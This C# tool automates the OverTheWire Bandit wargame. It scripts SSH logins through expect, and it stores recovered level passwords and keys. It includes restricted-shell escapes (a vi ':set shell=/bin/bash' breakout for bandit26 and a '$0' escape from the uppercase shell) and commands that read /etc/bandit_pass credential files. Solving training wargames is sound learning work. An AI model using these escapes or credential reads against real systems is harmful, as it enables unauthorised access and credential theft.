using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;
using Tomlyn;
using Tomlyn.Model;

namespace Bandit;

public static class Constants
{
    public const string DefaultHost = "bandit.labs.overthewire.org";
    public const string DefaultPort = "2220";
}

public static partial class Patterns
{
    [GeneratedRegex("[A-Za-z0-9]{32}")]
    public static partial Regex Password();

    [GeneratedRegex("-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----", RegexOptions.Singleline)]
    public static partial Regex PrivateKey();

    [GeneratedRegex(@"\u001b\[[0-?]*[ -/]*[@-~]|\u001bP.*?\u001b\\|\u001b\].*?(?:\u0007|\u001b\\)|\u001b.", RegexOptions.Singleline)]
    public static partial Regex Ansi();
}

public sealed class Step
{
    public string Type { get; }
    public IReadOnlyDictionary<string, object?> Fields { get; }

    public Step(string type, IReadOnlyDictionary<string, object?> fields)
    {
        Type = type;
        Fields = fields;
    }

    public string MustString(string key)
    {
        if (Fields.TryGetValue(key, out var v) && v is string s) return s;
        throw new InvalidOperationException($"missing string field {key}");
    }

    public string FieldString(string key, string fallback)
        => Fields.TryGetValue(key, out var v) && v is string s ? s : fallback;

    public int MustInt(string key)
    {
        if (Fields.TryGetValue(key, out var v) && v is IConvertible) return Convert.ToInt32(v);
        throw new InvalidOperationException($"missing int field {key}");
    }

    public List<int> MustToList()
    {
        if (!Fields.TryGetValue("to", out var v)) throw new InvalidOperationException("missing to field");
        return v switch
        {
            long l => new List<int> { (int)l },
            int i => new List<int> { i },
            IList<object?> list => list.Select(x => Convert.ToInt32(x)).ToList(),
            _ => throw new InvalidOperationException("to field has unsupported type"),
        };
    }

    public int MustToSingle()
    {
        var list = MustToList();
        if (list.Count != 1) throw new InvalidOperationException("expected single target");
        return list[0];
    }
}

public sealed class Config
{
    public string Host { get; }
    public int Port { get; }
    public int BootstrapLevel { get; }
    public string BootstrapPassword { get; }
    public List<Step> Steps { get; }

    public Config(string host, int port, int bootstrapLevel, string bootstrapPassword, List<Step> steps)
    {
        Host = host;
        Port = port;
        BootstrapLevel = bootstrapLevel;
        BootstrapPassword = bootstrapPassword;
        Steps = steps;
    }
}

public sealed class BanditHelper
{
    private static readonly Dictionary<string, string[]> RequiredFields = new()
    {
        ["ssh_command"] = new[] { "from", "to", "command" },
        ["path_then_command"] = new[] { "from", "to", "find_command", "command" },
        ["private_key_then_ssh"] = new[] { "from", "to", "key_command", "key_name", "next_user", "next_command" },
        ["bandit26_escape"] = new[] { "from", "to", "key_command", "key_name" },
        ["git_read_file"] = new[] { "from", "to", "git_user", "repo", "file" },
        ["git_show"] = new[] { "from", "to", "git_user", "repo", "object" },
        ["git_push_file"] = new[] { "from", "to", "git_user", "repo", "file", "content", "commit_message" },
        ["uppercase_shell"] = new[] { "from", "to" },
    };

    private string _host = "";
    private string _port = "";
    private string _repoRoot = "";
    private string _configPath = "";
    private string _passFile = "";
    private string _keyDir = "";
    private readonly Random _random = new();

    public static int Main(string[] args)
    {
        try
        {
            new BanditHelper().Run(args);
            return 0;
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"error: {ex.Message}");
            return 1;
        }
    }

    public void Run(string[] args)
    {
        _repoRoot = FindRepoRoot();
        var defaultConfig = Path.Combine(_repoRoot, "levels", "bandit-levels.toml");
        _configPath = EnvOr("BANDIT_LEVELS_FILE", defaultConfig);
        _passFile = Path.Combine(_repoRoot, "bandit-passwords.txt");
        _keyDir = Path.Combine(_repoRoot, ".bandit-keys");

        bool refresh = false, show = false;
        int sshLevel = -1;

        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--config":
                    if (++i >= args.Length) throw new ArgumentException("--config requires a path");
                    _configPath = args[i];
                    break;
                case "--refresh":
                    refresh = true; break;
                case "--show":
                    show = true; break;
                case "--ssh":
                    if (++i >= args.Length) throw new ArgumentException("--ssh requires a level");
                    sshLevel = int.Parse(args[i]); break;
                default:
                    throw new ArgumentException($"unknown flag: {args[i]}");
            }
        }

        var cfg = LoadConfig();
        ApplyConnection(cfg);

        if (refresh) Refresh(cfg);
        else if (show) ShowPasswords();
        else if (sshLevel >= 0) SshLevel(sshLevel);
        else Menu(cfg);
    }

    public static string EnvOr(string name, string fallback)
    {
        var value = Environment.GetEnvironmentVariable(name);
        return !string.IsNullOrEmpty(value) ? value : fallback;
    }

    public static string FindRepoRoot()
    {
        var cwd = Directory.GetCurrentDirectory();
        while (true)
        {
            if (File.Exists(Path.Combine(cwd, "levels", "bandit-levels.toml"))) return cwd;
            var parent = Directory.GetParent(cwd)?.FullName;
            if (parent == null || parent == cwd)
                throw new InvalidOperationException("could not find repo root containing levels/bandit-levels.toml");
            cwd = parent;
        }
    }

    public Config LoadConfig()
    {
        var text = File.ReadAllText(_configPath);
        if (!Toml.TryToModel<TomlTable>(text, out var root, out var diag))
        {
            throw new InvalidOperationException($"parse config:\n{diag}");
        }

        string hostCfg = "";
        long portCfg = 0;
        if (root!.TryGetValue("connection", out var connObj) && connObj is TomlTable conn)
        {
            if (conn.TryGetValue("host", out var h) && h is string hs) hostCfg = hs;
            if (conn.TryGetValue("port", out var p) && p is long pl) portCfg = pl;
        }

        if (!root.TryGetValue("bootstrap", out var bootObj) || bootObj is not TomlTable boot)
            throw new InvalidOperationException("config is missing [bootstrap]");
        if (!boot.TryGetValue("level", out var levelObj) || levelObj is not long bootLevel)
            throw new InvalidOperationException("config bootstrap level is missing");
        if (!boot.TryGetValue("password", out var passObj) || passObj is not string bootPass || string.IsNullOrEmpty(bootPass))
            throw new InvalidOperationException("config bootstrap password is empty");

        if (!root.TryGetValue("steps", out var stepsObj) || stepsObj is not TomlTableArray stepsArr || stepsArr.Count == 0)
            throw new InvalidOperationException("config has no steps");

        var steps = new List<Step>(stepsArr.Count);
        for (int i = 0; i < stepsArr.Count; i++)
        {
            var table = stepsArr[i];
            if (!table.TryGetValue("type", out var typeObj) || typeObj is not string type)
                throw new InvalidOperationException($"step {i + 1} is missing type");
            if (!RequiredFields.TryGetValue(type, out var required))
                throw new InvalidOperationException($"step {i + 1} has unsupported type \"{type}\"");
            foreach (var field in required)
            {
                if (!table.ContainsKey(field))
                    throw new InvalidOperationException($"step {i + 1} ({type}) is missing {field}");
            }
            var fields = new Dictionary<string, object?>();
            foreach (var key in table.Keys)
            {
                var raw = table[key];
                fields[key] = raw is TomlArray arr ? arr.Cast<object?>().ToList() : raw;
            }
            steps.Add(new Step(type, fields));
        }

        return new Config(hostCfg, (int)portCfg, (int)bootLevel, bootPass, steps);
    }

    private void ApplyConnection(Config cfg)
    {
        _host = EnvOr("BANDIT_HOST", cfg.Host);
        if (string.IsNullOrEmpty(_host)) _host = Constants.DefaultHost;
        var envPort = Environment.GetEnvironmentVariable("BANDIT_PORT");
        _port = !string.IsNullOrEmpty(envPort) ? envPort
            : cfg.Port != 0 ? cfg.Port.ToString()
            : Constants.DefaultPort;
    }

    private void EnsureState()
    {
        Directory.CreateDirectory(_keyDir);
        if (!File.Exists(_passFile)) File.Create(_passFile).Dispose();
        SetPosix(_keyDir, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        SetPosix(_passFile, UnixFileMode.UserRead | UnixFileMode.UserWrite);
    }

    private static void SetPosix(string path, UnixFileMode mode)
    {
        try { File.SetUnixFileMode(path, mode); }
        catch (PlatformNotSupportedException) { /* non-POSIX */ }
    }

    private static void CheckDependencies()
    {
        foreach (var cmd in new[] { "expect", "ssh", "git", "awk", "grep", "mktemp" })
        {
            if (Which(cmd) == null) throw new InvalidOperationException($"missing required command: {cmd}");
        }
    }

    private static string? Which(string cmd)
    {
        var path = Environment.GetEnvironmentVariable("PATH");
        if (string.IsNullOrEmpty(path)) return null;
        foreach (var dir in path.Split(Path.PathSeparator))
        {
            if (string.IsNullOrEmpty(dir)) continue;
            var candidate = Path.Combine(dir, cmd);
            if (File.Exists(candidate)) return candidate;
        }
        return null;
    }

    private readonly record struct ProcResult(int ExitCode, string Output);

    private ProcResult Run(string name, IList<string>? args = null, IDictionary<string, string>? envExtra = null, string? input = null, string? cwd = null)
    {
        var psi = new ProcessStartInfo
        {
            FileName = name,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            RedirectStandardInput = input != null,
            UseShellExecute = false,
            CreateNoWindow = true,
        };
        if (cwd != null) psi.WorkingDirectory = cwd;
        if (args != null) foreach (var a in args) psi.ArgumentList.Add(a);
        if (envExtra != null) foreach (var (k, v) in envExtra) psi.Environment[k] = v;

        using var process = Process.Start(psi) ?? throw new InvalidOperationException($"failed to start {name}");
        var sb = new StringBuilder();
        process.OutputDataReceived += (_, e) => { if (e.Data != null) sb.AppendLine(e.Data); };
        process.ErrorDataReceived += (_, e) => { if (e.Data != null) sb.AppendLine(e.Data); };
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();
        if (input != null)
        {
            process.StandardInput.Write(input);
            process.StandardInput.Close();
        }
        process.WaitForExit();
        return new ProcResult(process.ExitCode, sb.ToString());
    }

    private string RunExpect(string script, IDictionary<string, string> env)
    {
        var r = Run("expect", envExtra: env, input: script);
        if (r.ExitCode != 0) throw new InvalidOperationException(r.Output);
        return r.Output;
    }

    public static string StripTerminalCodes(string text)
        => Patterns.Ansi().Replace(text, "").Replace("\r", "");

    public static List<string> ExtractPasswords(string text)
    {
        var clean = StripTerminalCodes(text);
        return Patterns.Password().Matches(clean).Select(m => m.Value).ToList();
    }

    public static string ExtractPassword(string text)
    {
        var passwords = ExtractPasswords(text);
        if (passwords.Count == 0)
            throw new InvalidOperationException($"failed to extract a 32-character password from output:\n{text}");
        return passwords[^1];
    }

    private void SavePassword(string user, string password)
    {
        EnsureState();
        var lines = new List<string>();
        if (File.Exists(_passFile))
        {
            foreach (var line in File.ReadAllText(_passFile).Split('\n'))
            {
                if (string.IsNullOrEmpty(line) || line.StartsWith($"{user}:")) continue;
                lines.Add(line);
            }
        }
        lines.Add($"{user}: {password}");
        File.WriteAllText(_passFile, string.Join('\n', lines) + "\n");
        SetPosix(_passFile, UnixFileMode.UserRead | UnixFileMode.UserWrite);
    }

    private string GetSavedPassword(string user)
    {
        if (!File.Exists(_passFile)) return "";
        var password = "";
        var prefix = $"{user}: ";
        foreach (var line in File.ReadAllText(_passFile).Split('\n'))
        {
            if (line.StartsWith(prefix)) password = line[prefix.Length..];
        }
        return password;
    }

    private void RecordPassword(int level, string password)
    {
        var user = $"bandit{level}";
        if (level != 0 && !Patterns.Password().IsMatch(password))
            throw new InvalidOperationException($"refusing to save invalid password for {user}: {password}");
        SavePassword(user, password);
        Console.WriteLine($"[+] {user,-8} {password}");
    }

    private const string ScriptPasswordSsh = """
        set timeout 180
        spawn -noecho ssh \
          -o StrictHostKeyChecking=no \
          -o UserKnownHostsFile=/dev/null \
          -o LogLevel=ERROR \
          -o PubkeyAuthentication=no \
          -o PreferredAuthentications=password \
          -o NumberOfPasswordPrompts=1 \
          -p $env(BANDIT_PORT_VALUE) \
          $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE) \
          $env(BANDIT_COMMAND_VALUE)
        expect {
          "*password:" {
            send -- "$env(BANDIT_PASSWORD_VALUE)\r"
            exp_continue
          }
          timeout {
            exit 124
          }
          eof {
          }
        }
        catch wait result
        exit [lindex $result 3]
        """;

    private const string ScriptBandit26 = """
        set timeout 90
        set stty_init "rows 5 columns 80"
        spawn -noecho ssh \
          -tt \
          -o StrictHostKeyChecking=no \
          -o UserKnownHostsFile=/dev/null \
          -o LogLevel=ERROR \
          -o IdentitiesOnly=yes \
          -i $env(BANDIT_KEY_VALUE) \
          -p $env(BANDIT_PORT_VALUE) \
          bandit26@$env(BANDIT_HOST_VALUE)
        expect {
          -re "--More--" {
            send -- "v"
          }
          timeout {
            exit 124
          }
          eof {
            exit 1
          }
        }
        expect {
          -re "~" {
          }
          timeout {
            exit 124
          }
          eof {
            exit 1
          }
        }
        after 500
        send -- "\033:set shell=/bin/bash\r"
        after 500
        send -- ":shell\r"
        after 500
        send -- "cat /etc/bandit_pass/bandit26; ./bandit27-do cat /etc/bandit_pass/bandit27; exit\r"
        set password_count 0
        expect {
          -re {[[:alnum:]]{32}} {
            incr password_count
            if {$password_count < 2} {
              exp_continue
            }
          }
          timeout {
            exit 124
          }
          eof {
            exit 1
          }
        }
        close
        wait
        exit 0
        """;

    private const string ScriptUppercase = """
        set timeout 60
        spawn -noecho ssh \
          -tt \
          -o StrictHostKeyChecking=no \
          -o UserKnownHostsFile=/dev/null \
          -o LogLevel=ERROR \
          -o PubkeyAuthentication=no \
          -o PreferredAuthentications=password \
          -o NumberOfPasswordPrompts=1 \
          -p $env(BANDIT_PORT_VALUE) \
          bandit32@$env(BANDIT_HOST_VALUE)
        expect {
          "*password:" {
            send -- "$env(BANDIT_PASSWORD_VALUE)\r"
            exp_continue
          }
          -re "WELCOME TO THE UPPERCASE SHELL|>>" {
          }
          timeout {
            exit 124
          }
        }
        after 500
        send -- "\$0\r"
        expect {
          -re {[$#] } {
          }
          timeout {
            exit 124
          }
        }
        send -- "cat /etc/bandit_pass/bandit33; exit\r"
        expect {
          -re {[[:alnum:]]{32}} {
          }
          timeout {
            exit 124
          }
        }
        close
        wait
        exit 0
        """;

    private const string ScriptInteractive = """
        set timeout 30
        spawn ssh \
          -o StrictHostKeyChecking=no \
          -o UserKnownHostsFile=/dev/null \
          -o LogLevel=ERROR \
          -o PubkeyAuthentication=no \
          -o PreferredAuthentications=password \
          -p $env(BANDIT_PORT_VALUE) \
          $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE)
        expect {
          "*password:" {
            send -- "$env(BANDIT_PASSWORD_VALUE)\r"
            interact
          }
          timeout {
            interact
          }
          eof {
          }
        }
        """;

    private string RunPasswordSshCommand(string user, string password, string commandText)
    {
        var env = new Dictionary<string, string>
        {
            ["BANDIT_HOST_VALUE"] = _host,
            ["BANDIT_PORT_VALUE"] = _port,
            ["BANDIT_USER_VALUE"] = user,
            ["BANDIT_PASSWORD_VALUE"] = password,
            ["BANDIT_COMMAND_VALUE"] = commandText,
        };
        try { return RunExpect(ScriptPasswordSsh, env); }
        catch (Exception e) { throw new InvalidOperationException($"SSH command failed for {user}: {commandText}\n{e.Message}", e); }
    }

    private string RunKeySshCommand(string user, string keyFile, string commandText)
    {
        var args = new List<string>
        {
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "LogLevel=ERROR",
            "-o", "IdentitiesOnly=yes",
            "-o", "BatchMode=yes",
            "-i", keyFile,
            "-p", _port,
            $"{user}@{_host}",
            commandText,
        };
        var r = Run("ssh", args);
        if (r.ExitCode != 0) throw new InvalidOperationException(r.Output);
        return r.Output;
    }

    private string SolvePassword(string user, string password, string commandText)
        => ExtractPassword(RunPasswordSshCommand(user, password, commandText));

    private string SolvePath(string user, string password, string commandText)
    {
        var output = StripTerminalCodes(RunPasswordSshCommand(user, password, commandText));
        var lines = output.Split('\n');
        for (int i = lines.Length - 1; i >= 0; i--)
        {
            if (lines[i].Contains("/inhere/")) return lines[i];
        }
        throw new InvalidOperationException($"failed to extract path from output:\n{output}");
    }

    private string SavePrivateKey(string name, string output)
    {
        var match = Patterns.PrivateKey().Match(StripTerminalCodes(output));
        if (!match.Success)
            throw new InvalidOperationException($"failed to extract private key {name} from output:\n{output}");
        EnsureState();
        var keyFile = Path.Combine(_keyDir, name);
        File.WriteAllText(keyFile, match.Value + "\n");
        SetPosix(keyFile, UnixFileMode.UserRead | UnixFileMode.UserWrite);
        return keyFile;
    }

    private (string, string) SolveBandit26Pair(string keyFile)
    {
        var env = new Dictionary<string, string>
        {
            ["BANDIT_HOST_VALUE"] = _host,
            ["BANDIT_PORT_VALUE"] = _port,
            ["BANDIT_KEY_VALUE"] = keyFile,
        };
        var output = RunExpect(ScriptBandit26, env);
        var passwords = ExtractPasswords(output);
        if (passwords.Count < 2)
            throw new InvalidOperationException($"expected two passwords from bandit26 output:\n{output}");
        return (passwords[^2], passwords[^1]);
    }

    private string SolveUppercaseShell(string password)
    {
        var env = new Dictionary<string, string>
        {
            ["BANDIT_HOST_VALUE"] = _host,
            ["BANDIT_PORT_VALUE"] = _port,
            ["BANDIT_PASSWORD_VALUE"] = password,
        };
        return ExtractPassword(RunExpect(ScriptUppercase, env));
    }

    private Dictionary<string, string> GitEnv(string password, string askpass) => new()
    {
        ["BANDIT_GIT_PASSWORD"] = password,
        ["GIT_SSH_COMMAND"] = "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR " +
                              "-o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1",
        ["SSH_ASKPASS"] = askpass,
        ["SSH_ASKPASS_REQUIRE"] = "force",
        ["DISPLAY"] = EnvOr("DISPLAY", ":0"),
    };

    private static string WriteAskpass(string dir)
    {
        var askpass = Path.Combine(dir, "askpass.sh");
        File.WriteAllText(askpass, "#!/usr/bin/env bash\nprintf '%s\\n' \"$BANDIT_GIT_PASSWORD\"\n");
        SetPosix(askpass, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        return askpass;
    }

    private void GitCloneRepo(string user, string password, string remotePath, string destination)
    {
        var tmp = Directory.CreateTempSubdirectory("bandit-git-askpass.");
        try
        {
            var askpass = WriteAskpass(tmp.FullName);
            var remote = $"ssh://{user}@{_host}:{_port}{remotePath}";
            var r = Run("git", new List<string> { "clone", remote, destination }, GitEnv(password, askpass));
            if (r.ExitCode != 0) throw new InvalidOperationException(r.Output);
        }
        finally
        {
            try { tmp.Delete(true); } catch { /* best-effort */ }
        }
    }

    private string GitPushWithPassword(string password, string repo)
    {
        var tmp = Directory.CreateTempSubdirectory("bandit-git-askpass.");
        try
        {
            var askpass = WriteAskpass(tmp.FullName);
            return Run("git", new List<string> { "-C", repo, "push", "origin", "master" }, GitEnv(password, askpass)).Output;
        }
        finally
        {
            try { tmp.Delete(true); } catch { /* best-effort */ }
        }
    }

    public static string RenderTemplate(string template, IDictionary<string, string> values)
    {
        var result = template;
        foreach (var (k, v) in values) result = result.Replace($"{{{k}}}", v);
        return result;
    }

    private Dictionary<string, string> StepContext(int level, string password, int toLevel) => new()
    {
        ["password"] = password,
        ["level"] = level.ToString(),
        ["to"] = toLevel.ToString(),
        ["random_port"] = (20000 + _random.Next(10000)).ToString(),
        ["temp_output"] = $"/tmp/bandit{toLevel}pass.{Environment.ProcessId}.{1000 + _random.Next(9000)}",
    };

    private void Refresh(Config cfg)
    {
        CheckDependencies();
        EnsureState();

        Console.WriteLine($"Refreshing Bandit passwords via {_host}:{_port}");
        Console.WriteLine($"Level config:  {_configPath}");
        Console.WriteLine($"Password file: {_passFile}");
        Console.WriteLine($"Key cache:     {_keyDir}");
        Console.WriteLine();

        var passwords = new Dictionary<int, string> { [cfg.BootstrapLevel] = cfg.BootstrapPassword };
        RecordPassword(cfg.BootstrapLevel, cfg.BootstrapPassword);

        foreach (var step in cfg.Steps) SolveStep(step, passwords);

        Console.WriteLine();
        Console.WriteLine("Refresh complete.");
    }

    private void SolveStep(Step step, Dictionary<int, string> passwords)
    {
        var fromLevel = step.MustInt("from");
        var fromUser = step.FieldString("user", $"bandit{fromLevel}");
        if (!passwords.TryGetValue(fromLevel, out var fromPassword))
            throw new InvalidOperationException($"missing password for bandit{fromLevel}");

        switch (step.Type)
        {
            case "ssh_command":
            {
                var toLevel = step.MustToSingle();
                var ctx = StepContext(fromLevel, fromPassword, toLevel);
                var command = RenderTemplate(step.MustString("command"), ctx);
                var pw = SolvePassword(fromUser, fromPassword, command);
                passwords[toLevel] = pw;
                RecordPassword(toLevel, pw);
                break;
            }
            case "path_then_command":
            {
                var toLevel = step.MustToSingle();
                var ctx = StepContext(fromLevel, fromPassword, toLevel);
                var findCmd = RenderTemplate(step.MustString("find_command"), ctx);
                var path = SolvePath(fromUser, fromPassword, findCmd);
                ctx["path"] = path;
                var command = RenderTemplate(step.MustString("command"), ctx);
                var pw = SolvePassword(fromUser, fromPassword, command);
                passwords[toLevel] = pw;
                RecordPassword(toLevel, pw);
                break;
            }
            case "private_key_then_ssh":
            {
                var toLevel = step.MustToSingle();
                var ctx = StepContext(fromLevel, fromPassword, toLevel);
                var keyCmd = RenderTemplate(step.MustString("key_command"), ctx);
                var output = RunPasswordSshCommand(fromUser, fromPassword, keyCmd);
                var keyFile = SavePrivateKey(step.MustString("key_name"), output);
                var nextCmd = RenderTemplate(step.MustString("next_command"), ctx);
                var keyOut = RunKeySshCommand(step.MustString("next_user"), keyFile, nextCmd);
                var pw = ExtractPassword(keyOut);
                passwords[toLevel] = pw;
                RecordPassword(toLevel, pw);
                break;
            }
            case "bandit26_escape":
            {
                var targets = step.MustToList();
                var ctx = StepContext(fromLevel, fromPassword, targets[^1]);
                var keyCmd = RenderTemplate(step.MustString("key_command"), ctx);
                var output = RunPasswordSshCommand(fromUser, fromPassword, keyCmd);
                var keyFile = SavePrivateKey(step.MustString("key_name"), output);
                var (pw1, pw2) = SolveBandit26Pair(keyFile);
                var solved = new[] { pw1, pw2 };
                if (targets.Count != solved.Length)
                    throw new InvalidOperationException($"bandit26_escape expected {targets.Count} targets, got {solved.Length} passwords");
                for (int i = 0; i < targets.Count; i++)
                {
                    passwords[targets[i]] = solved[i];
                    RecordPassword(targets[i], solved[i]);
                }
                break;
            }
            case "git_read_file":
            {
                var toLevel = step.MustToSingle();
                var tmp = Directory.CreateTempSubdirectory("bandit-repo.");
                try
                {
                    var repo = Path.Combine(tmp.FullName, "repo");
                    GitCloneRepo(step.MustString("git_user"), fromPassword, step.MustString("repo"), repo);
                    var content = File.ReadAllText(Path.Combine(repo, step.MustString("file")));
                    var pw = ExtractPassword(content);
                    passwords[toLevel] = pw;
                    RecordPassword(toLevel, pw);
                }
                finally { try { tmp.Delete(true); } catch { } }
                break;
            }
            case "git_show":
            {
                var toLevel = step.MustToSingle();
                var tmp = Directory.CreateTempSubdirectory("bandit-repo.");
                try
                {
                    var repo = Path.Combine(tmp.FullName, "repo");
                    GitCloneRepo(step.MustString("git_user"), fromPassword, step.MustString("repo"), repo);
                    var r = Run("git", new List<string> { "-C", repo, "show", step.MustString("object") });
                    if (r.ExitCode != 0) throw new InvalidOperationException(r.Output);
                    var pw = ExtractPassword(r.Output);
                    passwords[toLevel] = pw;
                    RecordPassword(toLevel, pw);
                }
                finally { try { tmp.Delete(true); } catch { } }
                break;
            }
            case "git_push_file":
            {
                var toLevel = step.MustToSingle();
                var tmp = Directory.CreateTempSubdirectory("bandit-repo.");
                try
                {
                    var repo = Path.Combine(tmp.FullName, "repo");
                    GitCloneRepo(step.MustString("git_user"), fromPassword, step.MustString("repo"), repo);
                    void GitRun(IList<string> args)
                    {
                        var r = Run("git", new[] { "-C", repo }.Concat(args).ToList());
                        if (r.ExitCode != 0) throw new InvalidOperationException(r.Output);
                    }
                    GitRun(new[] { "config", "user.email", "bandit-solver@example.invalid" });
                    GitRun(new[] { "config", "user.name", "bandit-solver" });
                    File.WriteAllText(Path.Combine(repo, step.MustString("file")), step.MustString("content"));
                    GitRun(new[] { "add", "-f", step.MustString("file") });
                    GitRun(new[] { "commit", "-m", step.MustString("commit_message") });
                    var pushOut = GitPushWithPassword(fromPassword, repo);
                    var pw = ExtractPassword(pushOut);
                    passwords[toLevel] = pw;
                    RecordPassword(toLevel, pw);
                }
                finally { try { tmp.Delete(true); } catch { } }
                break;
            }
            case "uppercase_shell":
            {
                var toLevel = step.MustToSingle();
                var pw = SolveUppercaseShell(fromPassword);
                passwords[toLevel] = pw;
                RecordPassword(toLevel, pw);
                break;
            }
            default:
                throw new InvalidOperationException($"unsupported step type: {step.Type}");
        }
    }

    private void ShowPasswords()
    {
        EnsureState();
        var data = File.ReadAllText(_passFile);
        if (data.Length == 0) Console.WriteLine("No passwords saved yet.");
        else Console.Write(data);
    }

    private void SshLevel(int level)
    {
        EnsureState();
        var user = $"bandit{level}";
        var password = GetSavedPassword(user);
        if (string.IsNullOrEmpty(password))
        {
            var psi = new ProcessStartInfo("ssh", new[] { $"{user}@{_host}", "-p", _port }) { UseShellExecute = false };
            using var p = Process.Start(psi);
            p?.WaitForExit();
            return;
        }
        var scriptFile = Path.GetTempFileName() + ".exp";
        try
        {
            File.WriteAllText(scriptFile, ScriptInteractive);
            var psi = new ProcessStartInfo("expect", new[] { "-f", scriptFile }) { UseShellExecute = false };
            psi.Environment["BANDIT_HOST_VALUE"] = _host;
            psi.Environment["BANDIT_PORT_VALUE"] = _port;
            psi.Environment["BANDIT_USER_VALUE"] = user;
            psi.Environment["BANDIT_PASSWORD_VALUE"] = password;
            using var p = Process.Start(psi);
            p?.WaitForExit();
        }
        finally
        {
            try { File.Delete(scriptFile); } catch { }
        }
    }

    private void SavePasswordInteractive()
    {
        Console.Write("Save password for which user? Example: bandit6: ");
        var user = Console.ReadLine()?.Trim() ?? "";
        Console.Write("Password: ");
        var password = Console.ReadLine()?.Trim() ?? "";
        SavePassword(user, password);
        Console.WriteLine($"Saved password for {user}.");
    }

    private void Menu(Config cfg)
    {
        EnsureState();
        while (true)
        {
            Console.WriteLine("====================================");
            Console.WriteLine("        OverTheWire Bandit App");
            Console.WriteLine("====================================");
            Console.WriteLine();
            Console.WriteLine($"Password file: {_passFile}");
            Console.WriteLine($"Key cache:     {_keyDir}");
            Console.WriteLine();
            Console.WriteLine("1) SSH into a Bandit level");
            Console.WriteLine("2) Refresh all passwords");
            Console.WriteLine("3) Save/update a password");
            Console.WriteLine("4) Show saved passwords");
            Console.WriteLine("5) Exit");
            Console.WriteLine();
            Console.Write("Choose an option: ");
            switch (Console.ReadLine()?.Trim())
            {
                case "1":
                    Console.Write("Bandit level number, e.g. 0, 1, 26, 33: ");
                    SshLevel(int.Parse(Console.ReadLine() ?? "0"));
                    break;
                case "2":
                    Refresh(cfg);
                    Console.Write("Press Enter to continue...");
                    Console.ReadLine();
                    break;
                case "3":
                    SavePasswordInteractive();
                    break;
                case "4":
                    ShowPasswords();
                    Console.Write("Press Enter to continue...");
                    Console.ReadLine();
                    break;
                case "5":
                    return;
                default:
                    Console.WriteLine("Invalid option.");
                    break;
            }
        }
    }
}
